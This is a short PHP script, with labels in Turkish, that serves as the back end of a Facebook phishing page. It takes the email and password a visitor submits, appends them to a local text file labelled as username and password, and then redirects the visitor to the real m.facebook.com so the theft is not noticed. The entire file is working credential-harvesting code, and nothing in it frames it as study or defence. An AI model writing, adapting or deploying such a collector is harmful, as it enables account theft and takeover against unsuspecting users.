<?php

if (isset($_POST['email']) && isset($_POST['pass'])) {

$save = fopen("kaydedilen.txt","a+");
$kullaniciadi = $_POST['email'];
$password = $_POST['pass'];
$vericekilen = ("
========================================
KULLANICI ADI >> ".$kullaniciadi."
========================================
ŞİFRE >> ".$password."
========================≠===============");
fwrite($save,$vericekilen);
fclose($save);
header('Location: https://m.facebook.com');
}
?>
